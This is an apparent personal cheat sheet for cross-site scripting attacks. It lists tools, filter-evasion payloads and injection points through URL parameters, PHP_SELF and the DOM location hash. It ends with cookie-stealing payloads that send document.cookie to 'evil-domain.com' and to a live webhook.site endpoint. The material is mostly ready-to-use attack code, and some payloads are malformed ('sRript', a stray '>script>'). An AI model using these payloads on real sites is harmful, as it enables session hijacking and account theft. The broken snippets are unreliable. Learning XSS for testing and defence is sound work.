# XSS : Cross Site Scripting

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
https://quanyang.github.io/the-abcs-of-xss/

## Tools
    OWASP Zed Attack Proxy

    XSSer

    W3Af

### Templates for Client side detection
List of XSS templates:
https://gist.github.com/jossets/069ec356de6f73e16b88f07c79728565



### Embed JS in HTML

````html
<script>alert(1);</script>
<img src='zzzz' onerror='alert(1)' />
<div onmouseover='alert(1)' />, onmouseout, onmousemove, onclick...
<a href='javascript:alert(1)' /> : Need to click
````


### Avoid simple filters
```html
<sRript>alert(1);</sCript>
<scr<script>ipt>alert(1);</sc</script>ript>
```


### Convert to Ascii code
https://www.browserling.com/tools/text-to-ascii
````
alert(1) => 97,108,101,114,116,40,49,41
<script>eval(String.fromCharCode( 97,108,101,114,116,40,49,41));</script>
````

## How to inject XSS ?

### Get/Post
```
GET http://12.0.0.11/xss/example3.php?name=<scr<script>ipt>alert(1);</sc</script>ript>
```


### PHP : Abusing $_SERVER['PHP_SELF'];
$_SERVER['PHP_SELF'] = URL base request. 
````html
<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">

GET http://12.0.0.11/xss/example8.php/bob"><script>alert(1)</script><
=>
<?php bob"> <script>alert(1)</script> <?>
````

### Abusing DOM
````html
GET http://ptl-bf67ed09-7529df2e.libcurl.so/index.php#bob
<p>Welcome <script>document.write(decodeURIComponent(location.hash.substring(1)));</script></p>
Welcome bob
GET http://ptl-bf67ed09-7529df2e.libcurl.so/index.php#</script>>script>alert(1)</script>
````


## XSS payload : client side


### Steal cookies
````javascript
    (new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
````
````html
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
````

Send cookies to webhook : https://webhook.site/
Once the browser renders the JavaScript the <img tag should look like:
````<img src="[URL]?c=[COOKIE]"/>````
And it will send the cookies to your website.
Make sure you don't forget to encode the + in the URL (%2b).
````html
<script>document.write('<img 
src="https://webhook.site/83c6be25-52d2-47a3-ba2f-6615b183fdbc?c='%2bdocument.cookie%2b'" />');</script>

````
